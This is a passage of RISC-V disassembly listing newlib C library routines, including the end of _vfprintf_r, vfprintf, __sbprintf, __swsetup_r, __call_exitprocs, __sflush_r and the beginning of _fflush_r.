   1227c:	f0be                	sd	a5,96(sp)
   1227e:	b25fe06f          	j	10da2 <_vfprintf_r+0x4d4>
   12282:	8826                	mv	a6,s1
   12284:	accff06f          	j	11550 <_vfprintf_r+0xc82>
   12288:	03000793          	li	a5,48
   1228c:	0ef10023          	sb	a5,224(sp)
   12290:	07800713          	li	a4,120
   12294:	bec1                	j	11e64 <_vfprintf_r+0x1596>
   12296:	77aa                	ld	a5,168(sp)
   12298:	8762                	mv	a4,s8
   1229a:	fdbe                	sd	a5,248(sp)
   1229c:	67c6                	ld	a5,80(sp)
   1229e:	fffc4683          	lbu	a3,-1(s8)
   122a2:	00f7c603          	lbu	a2,15(a5)
   122a6:	00d61e63          	bne	a2,a3,122c2 <_vfprintf_r+0x19f4>
   122aa:	03000593          	li	a1,48
   122ae:	feb70fa3          	sb	a1,-1(a4)
   122b2:	776e                	ld	a4,248(sp)
   122b4:	fff70693          	addi	a3,a4,-1
   122b8:	fdb6                	sd	a3,248(sp)
   122ba:	fff74683          	lbu	a3,-1(a4)
   122be:	fed608e3          	beq	a2,a3,122ae <_vfprintf_r+0x19e0>
   122c2:	0016861b          	addiw	a2,a3,1
   122c6:	03900593          	li	a1,57
   122ca:	0ff67613          	andi	a2,a2,255
   122ce:	00b68563          	beq	a3,a1,122d8 <_vfprintf_r+0x1a0a>
   122d2:	fec70fa3          	sb	a2,-1(a4)
   122d6:	bb39                	j	11ff4 <_vfprintf_r+0x1726>
   122d8:	67c6                	ld	a5,80(sp)
   122da:	00a7c603          	lbu	a2,10(a5)
   122de:	fec70fa3          	sb	a2,-1(a4)
   122e2:	bb09                	j	11ff4 <_vfprintf_r+0x1726>
   122e4:	001e859b          	addiw	a1,t4,1
   122e8:	8556                	mv	a0,s5
   122ea:	ec1a                	sd	t1,24(sp)
   122ec:	e476                	sd	t4,8(sp)
   122ee:	2a2030ef          	jal	ra,15590 <_malloc_r>
   122f2:	6ea2                	ld	t4,8(sp)
   122f4:	6362                	ld	t1,24(sp)
   122f6:	8caa                	mv	s9,a0
   122f8:	1e050063          	beqz	a0,124d8 <_vfprintf_r+0x1c0a>
   122fc:	ec2a                	sd	a0,24(sp)
   122fe:	b641                	j	11e7e <_vfprintf_r+0x15b0>
   12300:	000e9363          	bnez	t4,12306 <_vfprintf_r+0x1a38>
   12304:	4e85                	li	t4,1
   12306:	69b2                	ld	s3,264(sp)
   12308:	1004ef93          	ori	t6,s1,256
   1230c:	6c12                	ld	s8,256(sp)
   1230e:	2f81                	sext.w	t6,t6
   12310:	d609c1e3          	bltz	s3,12072 <_vfprintf_r+0x17a4>
   12314:	8776                	mv	a4,t4
   12316:	0f810893          	addi	a7,sp,248
   1231a:	0ec10813          	addi	a6,sp,236
   1231e:	11bc                	addi	a5,sp,232
   12320:	4689                	li	a3,2
   12322:	85e2                	mv	a1,s8
   12324:	864e                	mv	a2,s3
   12326:	8556                	mv	a0,s5
   12328:	ec7e                	sd	t6,24(sp)
   1232a:	f01a                	sd	t1,32(sp)
   1232c:	e476                	sd	t4,8(sp)
   1232e:	1f0020ef          	jal	ra,1451e <_ldtoa_r>
   12332:	6fe2                	ld	t6,24(sp)
   12334:	ed26                	sd	s1,152(sp)
   12336:	6ea2                	ld	t4,8(sp)
   12338:	7302                	ld	t1,32(sp)
   1233a:	8caa                	mv	s9,a0
   1233c:	84fe                	mv	s1,t6
   1233e:	ec02                	sd	zero,24(sp)
   12340:	e582                	sd	zero,200(sp)
   12342:	bb61                	j	120da <_vfprintf_r+0x180c>
   12344:	4e99                	li	t4,6
   12346:	9fbfe06f          	j	10d40 <_vfprintf_r+0x472>
   1234a:	c31c                	sw	a5,0(a4)
   1234c:	8ca2                	mv	s9,s0
   1234e:	813fe06f          	j	10b60 <_vfprintf_r+0x292>
   12352:	06700d93          	li	s11,103
   12356:	77a6                	ld	a5,104(sp)
   12358:	0ff00713          	li	a4,255
   1235c:	e882                	sd	zero,80(sp)
   1235e:	0007c783          	lbu	a5,0(a5)
   12362:	f082                	sd	zero,96(sp)
   12364:	02e78863          	beq	a5,a4,12394 <_vfprintf_r+0x1ac6>
   12368:	0ff00693          	li	a3,255
   1236c:	6666                	ld	a2,88(sp)
   1236e:	0007871b          	sext.w	a4,a5
   12372:	02c7d163          	bge	a5,a2,12394 <_vfprintf_r+0x1ac6>
   12376:	75a6                	ld	a1,104(sp)
   12378:	40e6073b          	subw	a4,a2,a4
   1237c:	ecba                	sd	a4,88(sp)
   1237e:	0015c783          	lbu	a5,1(a1)
   12382:	cf8d                	beqz	a5,123bc <_vfprintf_r+0x1aee>
   12384:	7706                	ld	a4,96(sp)
   12386:	2705                	addiw	a4,a4,1
   12388:	f0ba                	sd	a4,96(sp)
   1238a:	00158713          	addi	a4,a1,1
   1238e:	f4ba                	sd	a4,104(sp)
   12390:	fcd79ee3          	bne	a5,a3,1236c <_vfprintf_r+0x1a9e>
   12394:	7706                	ld	a4,96(sp)
   12396:	67c6                	ld	a5,80(sp)
   12398:	9fb9                	addw	a5,a5,a4
   1239a:	672a                	ld	a4,136(sp)
   1239c:	02e787bb          	mulw	a5,a5,a4
   123a0:	018787bb          	addw	a5,a5,s8
   123a4:	00078c1b          	sext.w	s8,a5
   123a8:	fffc4993          	not	s3,s8
   123ac:	43f9d993          	srai	s3,s3,0x3f
   123b0:	0137f7b3          	and	a5,a5,s3
   123b4:	0007899b          	sext.w	s3,a5
   123b8:	b29fe06f          	j	10ee0 <_vfprintf_r+0x612>
   123bc:	6746                	ld	a4,80(sp)
   123be:	77a6                	ld	a5,104(sp)
   123c0:	2705                	addiw	a4,a4,1
   123c2:	0007c783          	lbu	a5,0(a5)
   123c6:	e8ba                	sd	a4,80(sp)
   123c8:	b7e1                	j	12390 <_vfprintf_r+0x1ac2>
   123ca:	ec02                	sd	zero,24(sp)
   123cc:	84be                	mv	s1,a5
   123ce:	b16d                	j	12078 <_vfprintf_r+0x17aa>
   123d0:	85ce                	mv	a1,s3
   123d2:	8562                	mv	a0,s8
   123d4:	fc1a                	sd	t1,56(sp)
   123d6:	f876                	sd	t4,48(sp)
   123d8:	6d1090ef          	jal	ra,1c2a8 <__trunctfdf2>
   123dc:	11a8                	addi	a0,sp,232
   123de:	23d040ef          	jal	ra,16e1a <frexp>
   123e2:	607090ef          	jal	ra,1c1e8 <__extenddftf2>
   123e6:	0000a797          	auipc	a5,0xa
   123ea:	46a78793          	addi	a5,a5,1130 # 1c850 <zeroes.4521+0x30>
   123ee:	6390                	ld	a2,0(a5)
   123f0:	6794                	ld	a3,8(a5)
   123f2:	6f7080ef          	jal	ra,1b2e8 <__multf3>
   123f6:	4601                	li	a2,0
   123f8:	4681                	li	a3,0
   123fa:	f02a                	sd	a0,32(sp)
   123fc:	e42e                	sd	a1,8(sp)
   123fe:	507080ef          	jal	ra,1b104 <__eqtf2>
   12402:	62a2                	ld	t0,8(sp)
   12404:	7702                	ld	a4,32(sp)
   12406:	7ec2                	ld	t4,48(sp)
   12408:	7362                	ld	t1,56(sp)
   1240a:	e119                	bnez	a0,12410 <_vfprintf_r+0x1b42>
   1240c:	4785                	li	a5,1
   1240e:	d5be                	sw	a5,232(sp)
   12410:	0000a797          	auipc	a5,0xa
   12414:	26878793          	addi	a5,a5,616 # 1c678 <__clzdi2+0x19e>
   12418:	e8be                	sd	a5,80(sp)
   1241a:	bce1                	j	11ef2 <_vfprintf_r+0x1624>
   1241c:	0f210713          	addi	a4,sp,242
   12420:	e699                	bnez	a3,1242e <_vfprintf_r+0x1b60>
   12422:	03000713          	li	a4,48
   12426:	0ee10923          	sb	a4,242(sp)
   1242a:	0f310713          	addi	a4,sp,243
   1242e:	0c14                	addi	a3,sp,528
   12430:	0307879b          	addiw	a5,a5,48
   12434:	40d706b3          	sub	a3,a4,a3
   12438:	00f70023          	sb	a5,0(a4)
   1243c:	1216879b          	addiw	a5,a3,289
   12440:	e13e                	sd	a5,128(sp)
   12442:	a65fe06f          	j	10ea6 <_vfprintf_r+0x5d8>
   12446:	77c6                	ld	a5,112(sp)
   12448:	06600d93          	li	s11,102
   1244c:	00e78c3b          	addw	s8,a5,a4
   12450:	01dc0c3b          	addw	s8,s8,t4
   12454:	bb81                	j	121a4 <_vfprintf_r+0x18d6>
   12456:	676a                	ld	a4,152(sp)
   12458:	8b05                	andi	a4,a4,1
   1245a:	e319                	bnez	a4,12460 <_vfprintf_r+0x1b92>
   1245c:	a65fe06f          	j	10ec0 <_vfprintf_r+0x5f2>
   12460:	a5bfe06f          	j	10eba <_vfprintf_r+0x5ec>
   12464:	40ec07bb          	subw	a5,s8,a4
   12468:	2785                	addiw	a5,a5,1
   1246a:	00078c1b          	sext.w	s8,a5
   1246e:	fffc4993          	not	s3,s8
   12472:	43f9d993          	srai	s3,s3,0x3f
   12476:	0137f7b3          	and	a5,a5,s3
   1247a:	0007899b          	sext.w	s3,a5
   1247e:	bef1                	j	1205a <_vfprintf_r+0x178c>
   12480:	e791                	bnez	a5,1248c <_vfprintf_r+0x1bbe>
   12482:	4985                	li	s3,1
   12484:	06600d93          	li	s11,102
   12488:	4c05                	li	s8,1
   1248a:	bec1                	j	1205a <_vfprintf_r+0x178c>
   1248c:	77c6                	ld	a5,112(sp)
   1248e:	06600d93          	li	s11,102
   12492:	2785                	addiw	a5,a5,1
   12494:	01d78ebb          	addw	t4,a5,t4
   12498:	000e8c1b          	sext.w	s8,t4
   1249c:	fffc4993          	not	s3,s8
   124a0:	43f9d993          	srai	s3,s3,0x3f
   124a4:	013efeb3          	and	t4,t4,s3
   124a8:	000e899b          	sext.w	s3,t4
   124ac:	b67d                	j	1205a <_vfprintf_r+0x178c>
   124ae:	871a                	mv	a4,t1
   124b0:	c9aff06f          	j	1194a <_vfprintf_r+0x107c>
   124b4:	66c2                	ld	a3,16(sp)
   124b6:	4298                	lw	a4,0(a3)
   124b8:	06a1                	addi	a3,a3,8
   124ba:	00070e9b          	sext.w	t4,a4
   124be:	00075363          	bgez	a4,124c4 <_vfprintf_r+0x1bf6>
   124c2:	5efd                	li	t4,-1
   124c4:	00144f03          	lbu	t5,1(s0)
   124c8:	e836                	sd	a3,16(sp)
   124ca:	843e                	mv	s0,a5
   124cc:	d36fe06f          	j	10a02 <_vfprintf_r+0x134>
   124d0:	4789                	li	a5,2
   124d2:	e13e                	sd	a5,128(sp)
   124d4:	9d3fe06f          	j	10ea6 <_vfprintf_r+0x5d8>
   124d8:	010a5783          	lhu	a5,16(s4)
   124dc:	0407e793          	ori	a5,a5,64
   124e0:	00fa1823          	sh	a5,16(s4)
   124e4:	e8cfe06f          	j	10b70 <_vfprintf_r+0x2a2>

00000000000124e8 <vfprintf>:
   124e8:	86b2                	mv	a3,a2
   124ea:	862e                	mv	a2,a1
   124ec:	85aa                	mv	a1,a0
   124ee:	8601b503          	ld	a0,-1952(gp) # 1f558 <_impure_ptr>
   124f2:	bdcfe06f          	j	108ce <_vfprintf_r>

00000000000124f6 <__sbprintf>:
   124f6:	0105d783          	lhu	a5,16(a1)
   124fa:	0ac5ae03          	lw	t3,172(a1)
   124fe:	0125d303          	lhu	t1,18(a1)
   12502:	0305b883          	ld	a7,48(a1)
   12506:	0405b803          	ld	a6,64(a1)
   1250a:	b3010113          	addi	sp,sp,-1232
   1250e:	9bf5                	andi	a5,a5,-3
   12510:	40000713          	li	a4,1024
   12514:	4c813023          	sd	s0,1216(sp)
   12518:	00f11823          	sh	a5,16(sp)
   1251c:	842e                	mv	s0,a1
   1251e:	191c                	addi	a5,sp,176
   12520:	858a                	mv	a1,sp
   12522:	4a913c23          	sd	s1,1208(sp)
   12526:	4b213823          	sd	s2,1200(sp)
   1252a:	4c113423          	sd	ra,1224(sp)
   1252e:	892a                	mv	s2,a0
   12530:	d772                	sw	t3,172(sp)
   12532:	00611923          	sh	t1,18(sp)
   12536:	f846                	sd	a7,48(sp)
   12538:	e0c2                	sd	a6,64(sp)
   1253a:	e03e                	sd	a5,0(sp)
   1253c:	ec3e                	sd	a5,24(sp)
   1253e:	c63a                	sw	a4,12(sp)
   12540:	d03a                	sw	a4,32(sp)
   12542:	d402                	sw	zero,40(sp)
   12544:	b8afe0ef          	jal	ra,108ce <_vfprintf_r>
   12548:	84aa                	mv	s1,a0
   1254a:	02055963          	bgez	a0,1257c <__sbprintf+0x86>
   1254e:	01015783          	lhu	a5,16(sp)
   12552:	0407f793          	andi	a5,a5,64
   12556:	c799                	beqz	a5,12564 <__sbprintf+0x6e>
   12558:	01045783          	lhu	a5,16(s0)
   1255c:	0407e793          	ori	a5,a5,64
   12560:	00f41823          	sh	a5,16(s0)
   12564:	4c813083          	ld	ra,1224(sp)
   12568:	4c013403          	ld	s0,1216(sp)
   1256c:	4b013903          	ld	s2,1200(sp)
   12570:	8526                	mv	a0,s1
   12572:	4b813483          	ld	s1,1208(sp)
   12576:	4d010113          	addi	sp,sp,1232
   1257a:	8082                	ret
   1257c:	858a                	mv	a1,sp
   1257e:	854a                	mv	a0,s2
   12580:	354000ef          	jal	ra,128d4 <_fflush_r>
   12584:	d569                	beqz	a0,1254e <__sbprintf+0x58>
   12586:	54fd                	li	s1,-1
   12588:	b7d9                	j	1254e <__sbprintf+0x58>

000000000001258a <__swsetup_r>:
   1258a:	1101                	addi	sp,sp,-32
   1258c:	e822                	sd	s0,16(sp)
   1258e:	e426                	sd	s1,8(sp)
   12590:	ec06                	sd	ra,24(sp)
   12592:	8601b783          	ld	a5,-1952(gp) # 1f558 <_impure_ptr>
   12596:	84aa                	mv	s1,a0
   12598:	842e                	mv	s0,a1
   1259a:	c399                	beqz	a5,125a0 <__swsetup_r+0x16>
   1259c:	4bb8                	lw	a4,80(a5)
   1259e:	cf49                	beqz	a4,12638 <__swsetup_r+0xae>
   125a0:	01041703          	lh	a4,16(s0)
   125a4:	03071793          	slli	a5,a4,0x30
   125a8:	00877693          	andi	a3,a4,8
   125ac:	93c1                	srli	a5,a5,0x30
   125ae:	c29d                	beqz	a3,125d4 <__swsetup_r+0x4a>
   125b0:	6c14                	ld	a3,24(s0)
   125b2:	ce9d                	beqz	a3,125f0 <__swsetup_r+0x66>
   125b4:	0017f613          	andi	a2,a5,1
   125b8:	ce39                	beqz	a2,12616 <__swsetup_r+0x8c>
   125ba:	5010                	lw	a2,32(s0)
   125bc:	00042623          	sw	zero,12(s0)
   125c0:	4501                	li	a0,0
   125c2:	40c0063b          	negw	a2,a2
   125c6:	d410                	sw	a2,40(s0)
   125c8:	ceb9                	beqz	a3,12626 <__swsetup_r+0x9c>
   125ca:	60e2                	ld	ra,24(sp)
   125cc:	6442                	ld	s0,16(sp)
   125ce:	64a2                	ld	s1,8(sp)
   125d0:	6105                	addi	sp,sp,32
   125d2:	8082                	ret
   125d4:	0107f693          	andi	a3,a5,16
   125d8:	cac1                	beqz	a3,12668 <__swsetup_r+0xde>
   125da:	8b91                	andi	a5,a5,4
   125dc:	e3b5                	bnez	a5,12640 <__swsetup_r+0xb6>
   125de:	6c14                	ld	a3,24(s0)
   125e0:	00876713          	ori	a4,a4,8
   125e4:	03071793          	slli	a5,a4,0x30
   125e8:	00e41823          	sh	a4,16(s0)
   125ec:	93c1                	srli	a5,a5,0x30
   125ee:	f2f9                	bnez	a3,125b4 <__swsetup_r+0x2a>
   125f0:	2807f613          	andi	a2,a5,640
   125f4:	20000593          	li	a1,512
   125f8:	fab60ee3          	beq	a2,a1,125b4 <__swsetup_r+0x2a>
   125fc:	85a2                	mv	a1,s0
   125fe:	8526                	mv	a0,s1
   12600:	6d5020ef          	jal	ra,154d4 <__smakebuf_r>
   12604:	01041703          	lh	a4,16(s0)
   12608:	6c14                	ld	a3,24(s0)
   1260a:	03071793          	slli	a5,a4,0x30
   1260e:	93c1                	srli	a5,a5,0x30
   12610:	0017f613          	andi	a2,a5,1
   12614:	f25d                	bnez	a2,125ba <__swsetup_r+0x30>
   12616:	0027f613          	andi	a2,a5,2
   1261a:	4581                	li	a1,0
   1261c:	e211                	bnez	a2,12620 <__swsetup_r+0x96>
   1261e:	500c                	lw	a1,32(s0)
   12620:	c44c                	sw	a1,12(s0)
   12622:	4501                	li	a0,0
   12624:	f2dd                	bnez	a3,125ca <__swsetup_r+0x40>
   12626:	0807f793          	andi	a5,a5,128
   1262a:	d3c5                	beqz	a5,125ca <__swsetup_r+0x40>
   1262c:	04076713          	ori	a4,a4,64
   12630:	00e41823          	sh	a4,16(s0)
   12634:	557d                	li	a0,-1
   12636:	bf51                	j	125ca <__swsetup_r+0x40>
   12638:	853e                	mv	a0,a5
   1263a:	530000ef          	jal	ra,12b6a <__sinit>
   1263e:	b78d                	j	125a0 <__swsetup_r+0x16>
   12640:	6c2c                	ld	a1,88(s0)
   12642:	cd81                	beqz	a1,1265a <__swsetup_r+0xd0>
   12644:	07440793          	addi	a5,s0,116
   12648:	00f58763          	beq	a1,a5,12656 <__swsetup_r+0xcc>
   1264c:	8526                	mv	a0,s1
   1264e:	64e000ef          	jal	ra,12c9c <_free_r>
   12652:	01041703          	lh	a4,16(s0)
   12656:	04043c23          	sd	zero,88(s0)
   1265a:	6c14                	ld	a3,24(s0)
   1265c:	fdb77713          	andi	a4,a4,-37
   12660:	00042423          	sw	zero,8(s0)
   12664:	e014                	sd	a3,0(s0)
   12666:	bfad                	j	125e0 <__swsetup_r+0x56>
   12668:	47a5                	li	a5,9
   1266a:	c09c                	sw	a5,0(s1)
   1266c:	04076713          	ori	a4,a4,64
   12670:	00e41823          	sh	a4,16(s0)
   12674:	557d                	li	a0,-1
   12676:	bf91                	j	125ca <__swsetup_r+0x40>

0000000000012678 <__call_exitprocs>:
   12678:	715d                	addi	sp,sp,-80
   1267a:	f052                	sd	s4,32(sp)
   1267c:	8301ba03          	ld	s4,-2000(gp) # 1f528 <_global_impure_ptr>
   12680:	f84a                	sd	s2,48(sp)
   12682:	1f8a3903          	ld	s2,504(s4)
   12686:	e486                	sd	ra,72(sp)
   12688:	e0a2                	sd	s0,64(sp)
   1268a:	fc26                	sd	s1,56(sp)
   1268c:	f44e                	sd	s3,40(sp)
   1268e:	ec56                	sd	s5,24(sp)
   12690:	e85a                	sd	s6,16(sp)
   12692:	e45e                	sd	s7,8(sp)
   12694:	e062                	sd	s8,0(sp)
   12696:	02090863          	beqz	s2,126c6 <__call_exitprocs+0x4e>
   1269a:	8b2a                	mv	s6,a0
   1269c:	8bae                	mv	s7,a1
   1269e:	4a85                	li	s5,1
   126a0:	59fd                	li	s3,-1
   126a2:	00892483          	lw	s1,8(s2)
   126a6:	fff4841b          	addiw	s0,s1,-1
   126aa:	00044e63          	bltz	s0,126c6 <__call_exitprocs+0x4e>
   126ae:	048e                	slli	s1,s1,0x3
   126b0:	94ca                	add	s1,s1,s2
   126b2:	020b8663          	beqz	s7,126de <__call_exitprocs+0x66>
   126b6:	2084b783          	ld	a5,520(s1)
   126ba:	03778263          	beq	a5,s7,126de <__call_exitprocs+0x66>
   126be:	347d                	addiw	s0,s0,-1
   126c0:	14e1                	addi	s1,s1,-8
   126c2:	ff3418e3          	bne	s0,s3,126b2 <__call_exitprocs+0x3a>
   126c6:	60a6                	ld	ra,72(sp)
   126c8:	6406                	ld	s0,64(sp)
   126ca:	74e2                	ld	s1,56(sp)
   126cc:	7942                	ld	s2,48(sp)
   126ce:	79a2                	ld	s3,40(sp)
   126d0:	7a02                	ld	s4,32(sp)
   126d2:	6ae2                	ld	s5,24(sp)
   126d4:	6b42                	ld	s6,16(sp)
   126d6:	6ba2                	ld	s7,8(sp)
   126d8:	6c02                	ld	s8,0(sp)
   126da:	6161                	addi	sp,sp,80
   126dc:	8082                	ret
   126de:	00892783          	lw	a5,8(s2)
   126e2:	6498                	ld	a4,8(s1)
   126e4:	37fd                	addiw	a5,a5,-1
   126e6:	04878463          	beq	a5,s0,1272e <__call_exitprocs+0xb6>
   126ea:	0004b423          	sd	zero,8(s1)
   126ee:	db61                	beqz	a4,126be <__call_exitprocs+0x46>
   126f0:	31092783          	lw	a5,784(s2)
   126f4:	008a96bb          	sllw	a3,s5,s0
   126f8:	00892c03          	lw	s8,8(s2)
   126fc:	8ff5                	and	a5,a5,a3
   126fe:	2781                	sext.w	a5,a5
   12700:	ef89                	bnez	a5,1271a <__call_exitprocs+0xa2>
   12702:	9702                	jalr	a4
   12704:	00892703          	lw	a4,8(s2)
   12708:	1f8a3783          	ld	a5,504(s4)
   1270c:	01871463          	bne	a4,s8,12714 <__call_exitprocs+0x9c>
   12710:	faf907e3          	beq	s2,a5,126be <__call_exitprocs+0x46>
   12714:	dbcd                	beqz	a5,126c6 <__call_exitprocs+0x4e>
   12716:	893e                	mv	s2,a5
   12718:	b769                	j	126a2 <__call_exitprocs+0x2a>
   1271a:	31492783          	lw	a5,788(s2)
   1271e:	1084b583          	ld	a1,264(s1)
   12722:	8ff5                	and	a5,a5,a3
   12724:	2781                	sext.w	a5,a5
   12726:	e799                	bnez	a5,12734 <__call_exitprocs+0xbc>
   12728:	855a                	mv	a0,s6
   1272a:	9702                	jalr	a4
   1272c:	bfe1                	j	12704 <__call_exitprocs+0x8c>
   1272e:	00892423          	sw	s0,8(s2)
   12732:	bf75                	j	126ee <__call_exitprocs+0x76>
   12734:	852e                	mv	a0,a1
   12736:	9702                	jalr	a4
   12738:	b7f1                	j	12704 <__call_exitprocs+0x8c>

000000000001273a <__sflush_r>:
   1273a:	01059783          	lh	a5,16(a1)
   1273e:	7179                	addi	sp,sp,-48
   12740:	f022                	sd	s0,32(sp)
   12742:	e44e                	sd	s3,8(sp)
   12744:	f406                	sd	ra,40(sp)
   12746:	ec26                	sd	s1,24(sp)
   12748:	e84a                	sd	s2,16(sp)
   1274a:	0087f693          	andi	a3,a5,8
   1274e:	842e                	mv	s0,a1
   12750:	89aa                	mv	s3,a0
   12752:	eecd                	bnez	a3,1280c <__sflush_r+0xd2>
   12754:	6705                	lui	a4,0x1
   12756:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   1275a:	4594                	lw	a3,8(a1)
   1275c:	8fd9                	or	a5,a5,a4
   1275e:	00f59823          	sh	a5,16(a1)
   12762:	10d05363          	blez	a3,12868 <__sflush_r+0x12e>
   12766:	6438                	ld	a4,72(s0)
   12768:	cb51                	beqz	a4,127fc <__sflush_r+0xc2>
   1276a:	0009a483          	lw	s1,0(s3)
   1276e:	03079693          	slli	a3,a5,0x30
   12772:	0009a023          	sw	zero,0(s3)
   12776:	03379613          	slli	a2,a5,0x33
   1277a:	780c                	ld	a1,48(s0)
   1277c:	92c1                	srli	a3,a3,0x30
   1277e:	0e064963          	bltz	a2,12870 <__sflush_r+0x136>
   12782:	4601                	li	a2,0
   12784:	4685                	li	a3,1
   12786:	854e                	mv	a0,s3
   12788:	9702                	jalr	a4
   1278a:	57fd                	li	a5,-1
   1278c:	862a                	mv	a2,a0
   1278e:	10f50963          	beq	a0,a5,128a0 <__sflush_r+0x166>
   12792:	01045683          	lhu	a3,16(s0)
   12796:	6438                	ld	a4,72(s0)
   12798:	780c                	ld	a1,48(s0)
   1279a:	8a91                	andi	a3,a3,4
   1279c:	c699                	beqz	a3,127aa <__sflush_r+0x70>
   1279e:	4414                	lw	a3,8(s0)
   127a0:	6c3c                	ld	a5,88(s0)
   127a2:	8e15                	sub	a2,a2,a3
   127a4:	c399                	beqz	a5,127aa <__sflush_r+0x70>
   127a6:	583c                	lw	a5,112(s0)
   127a8:	8e1d                	sub	a2,a2,a5
   127aa:	4681                	li	a3,0
   127ac:	854e                	mv	a0,s3
   127ae:	9702                	jalr	a4
   127b0:	57fd                	li	a5,-1
   127b2:	0cf51163          	bne	a0,a5,12874 <__sflush_r+0x13a>
   127b6:	0009a703          	lw	a4,0(s3)
   127ba:	01041783          	lh	a5,16(s0)
   127be:	0e070f63          	beqz	a4,128bc <__sflush_r+0x182>
   127c2:	46f5                	li	a3,29
   127c4:	00d70563          	beq	a4,a3,127ce <__sflush_r+0x94>
   127c8:	46d9                	li	a3,22
   127ca:	0ed71f63          	bne	a4,a3,128c8 <__sflush_r+0x18e>
   127ce:	6c14                	ld	a3,24(s0)
   127d0:	777d                	lui	a4,0xfffff
   127d2:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7177>
   127d6:	8ff9                	and	a5,a5,a4
   127d8:	00f41823          	sh	a5,16(s0)
   127dc:	00042423          	sw	zero,8(s0)
   127e0:	e014                	sd	a3,0(s0)
   127e2:	6c2c                	ld	a1,88(s0)
   127e4:	0099a023          	sw	s1,0(s3)
   127e8:	c991                	beqz	a1,127fc <__sflush_r+0xc2>
   127ea:	07440793          	addi	a5,s0,116
   127ee:	00f58563          	beq	a1,a5,127f8 <__sflush_r+0xbe>
   127f2:	854e                	mv	a0,s3
   127f4:	4a8000ef          	jal	ra,12c9c <_free_r>
   127f8:	04043c23          	sd	zero,88(s0)
   127fc:	4501                	li	a0,0
   127fe:	70a2                	ld	ra,40(sp)
   12800:	7402                	ld	s0,32(sp)
   12802:	64e2                	ld	s1,24(sp)
   12804:	6942                	ld	s2,16(sp)
   12806:	69a2                	ld	s3,8(sp)
   12808:	6145                	addi	sp,sp,48
   1280a:	8082                	ret
   1280c:	0185b903          	ld	s2,24(a1)
   12810:	fe0906e3          	beqz	s2,127fc <__sflush_r+0xc2>
   12814:	6184                	ld	s1,0(a1)
   12816:	03079713          	slli	a4,a5,0x30
   1281a:	9341                	srli	a4,a4,0x30
   1281c:	8b0d                	andi	a4,a4,3
   1281e:	0125b023          	sd	s2,0(a1)
   12822:	412484bb          	subw	s1,s1,s2
   12826:	4781                	li	a5,0
   12828:	e311                	bnez	a4,1282c <__sflush_r+0xf2>
   1282a:	519c                	lw	a5,32(a1)
   1282c:	c45c                	sw	a5,12(s0)
   1282e:	00904663          	bgtz	s1,1283a <__sflush_r+0x100>
   12832:	b7e9                	j	127fc <__sflush_r+0xc2>
   12834:	992a                	add	s2,s2,a0
   12836:	fc9053e3          	blez	s1,127fc <__sflush_r+0xc2>
   1283a:	603c                	ld	a5,64(s0)
   1283c:	780c                	ld	a1,48(s0)
   1283e:	86a6                	mv	a3,s1
   12840:	864a                	mv	a2,s2
   12842:	854e                	mv	a0,s3
   12844:	9782                	jalr	a5
   12846:	9c89                	subw	s1,s1,a0
   12848:	fea046e3          	bgtz	a0,12834 <__sflush_r+0xfa>
   1284c:	01045783          	lhu	a5,16(s0)
   12850:	70a2                	ld	ra,40(sp)
   12852:	64e2                	ld	s1,24(sp)
   12854:	0407e793          	ori	a5,a5,64
   12858:	00f41823          	sh	a5,16(s0)
   1285c:	7402                	ld	s0,32(sp)
   1285e:	6942                	ld	s2,16(sp)
   12860:	69a2                	ld	s3,8(sp)
   12862:	557d                	li	a0,-1
   12864:	6145                	addi	sp,sp,48
   12866:	8082                	ret
   12868:	59b8                	lw	a4,112(a1)
   1286a:	eee04ee3          	bgtz	a4,12766 <__sflush_r+0x2c>
   1286e:	b779                	j	127fc <__sflush_r+0xc2>
   12870:	6850                	ld	a2,144(s0)
   12872:	b725                	j	1279a <__sflush_r+0x60>
   12874:	01045783          	lhu	a5,16(s0)
   12878:	777d                	lui	a4,0xfffff
   1287a:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7177>
   1287e:	8ff9                	and	a5,a5,a4
   12880:	6c14                	ld	a3,24(s0)
   12882:	0107979b          	slliw	a5,a5,0x10
   12886:	4107d79b          	sraiw	a5,a5,0x10
   1288a:	00f41823          	sh	a5,16(s0)
   1288e:	00042423          	sw	zero,8(s0)
   12892:	e014                	sd	a3,0(s0)
   12894:	03379713          	slli	a4,a5,0x33
   12898:	f40755e3          	bgez	a4,127e2 <__sflush_r+0xa8>
   1289c:	e848                	sd	a0,144(s0)
   1289e:	b791                	j	127e2 <__sflush_r+0xa8>
   128a0:	0009a783          	lw	a5,0(s3)
   128a4:	ee0787e3          	beqz	a5,12792 <__sflush_r+0x58>
   128a8:	4775                	li	a4,29
   128aa:	00e78563          	beq	a5,a4,128b4 <__sflush_r+0x17a>
   128ae:	4759                	li	a4,22
   128b0:	f8e79ee3          	bne	a5,a4,1284c <__sflush_r+0x112>
   128b4:	0099a023          	sw	s1,0(s3)
   128b8:	4501                	li	a0,0
   128ba:	b791                	j	127fe <__sflush_r+0xc4>
   128bc:	777d                	lui	a4,0xfffff
   128be:	7ff70713          	addi	a4,a4,2047 # fffffffffffff7ff <__BSS_END__+0xfffffffffffc7177>
   128c2:	6c14                	ld	a3,24(s0)
   128c4:	8ff9                	and	a5,a5,a4
   128c6:	b7d1                	j	1288a <__sflush_r+0x150>
   128c8:	0407e793          	ori	a5,a5,64
   128cc:	00f41823          	sh	a5,16(s0)
   128d0:	557d                	li	a0,-1
   128d2:	b735                	j	127fe <__sflush_r+0xc4>

00000000000128d4 <_fflush_r>:
   128d4:	1101                	addi	sp,sp,-32
   128d6:	e822                	sd	s0,16(sp)
   128d8:	ec06                	sd	ra,24(sp)
   128da:	842a                	mv	s0,a0
   128dc:	c119                	beqz	a0,128e2 <_fflush_r+0xe>
   128de:	493c                	lw	a5,80(a0)
   128e0:	cb89                	beqz	a5,128f2 <_fflush_r+0x1e>
   128e2:	01059783          	lh	a5,16(a1)
   128e6:	ef89                	bnez	a5,12900 <_fflush_r+0x2c>
   128e8:	60e2                	ld	ra,24(sp)
   128ea:	6442                	ld	s0,16(sp)
   128ec:	4501                	li	a0,0
   128ee:	6105                	addi	sp,sp,32
   128f0:	8082                	ret
   128f2:	e42e                	sd	a1,8(sp)
   128f4:	276000ef          	jal	ra,12b6a <__sinit>
   128f8:	65a2                	ld	a1,8(sp)
   128fa:	01059783          	lh	a5,16(a1)
   128fe:	d7ed                	beqz	a5,128e8 <_fflush_r+0x14>
   12900:	8522                	mv	a0,s0
